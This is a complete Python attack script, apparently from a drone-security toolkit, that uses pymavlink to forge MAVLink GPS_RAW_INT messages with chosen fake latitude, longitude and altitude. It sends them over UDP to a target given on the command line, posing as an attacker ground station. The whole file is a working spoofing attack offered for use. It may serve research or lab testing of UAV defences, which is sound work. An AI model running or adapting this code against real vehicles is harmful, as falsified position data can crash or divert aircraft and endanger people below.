#!/usr/bin/env python3
"""
GPS Spoofing Attack Module

Sends fake GPS coordinates to mislead navigation system.
"""
import time
import sys
import socket
from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mavlink2

def attack_gps_spoofing(sock, mav, target_ip, target_port, fake_lat: float, fake_lon: float, fake_alt: float, count: int = 10):
    """
    Send fake GPS coordinates
    
    Args:
        sock: UDP socket
        mav: MAVLink packer
        target_ip: Target IP address
        target_port: Target port
        fake_lat: Spoofed latitude (degrees)
        fake_lon: Spoofed longitude (degrees)
        fake_alt: Spoofed altitude (meters)
        count: Number of spoofed messages to send
    """
    print(f"[GPS SPOOF] Sending {count} fake GPS messages...")
    print(f"[GPS SPOOF] Fake Position: Lat={fake_lat}, Lon={fake_lon}, Alt={fake_alt}m")
    
    for i in range(count):
        try:
            msg = mav.gps_raw_int_encode(
                time_usec=int(time.time() * 1e6),
                fix_type=3,  # 3D fix
                lat=int(fake_lat * 1e7),
                lon=int(fake_lon * 1e7),
                alt=int(fake_alt * 1000),
                eph=100,
                epv=100,
                vel=500,
                cog=18000,
                satellites_visible=12
            )
            packet = msg.pack(mav)
            sock.sendto(packet, (target_ip, target_port))
            print(f"[GPS SPOOF] Message {i+1}/{count} sent")
            print(f"[ATTACKER] Sent GPS_RAW_INT to {target_ip}:{target_port} ({len(packet)} bytes)")
            time.sleep(0.5)
        except Exception as e:
            print(f"[GPS SPOOF] Error: {e}")
            break
    
    print(f"[GPS SPOOF] Attack complete!")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python gps_spoof.py <target_ip> <target_port> [lat] [lon] [alt]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    lat = float(sys.argv[3]) if len(sys.argv) > 3 else 37.7749
    lon = float(sys.argv[4]) if len(sys.argv) > 4 else -122.4194
    alt = float(sys.argv[5]) if len(sys.argv) > 5 else 1000
    
    # Create raw UDP socket (reliable on Windows)
    print(f"[ATTACKER] Creating UDP socket for: {target_ip}:{target_port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Create MAVLink packer (NO network binding - pure encoder)
    mav = mavlink2.MAVLink(None)
    mav.srcSystem = 255  # Attacker system ID
    mav.srcComponent = 190  # Attacker component ID
    
    time.sleep(1)
    attack_gps_spoofing(sock, mav, target_ip, target_port, lat, lon, alt)
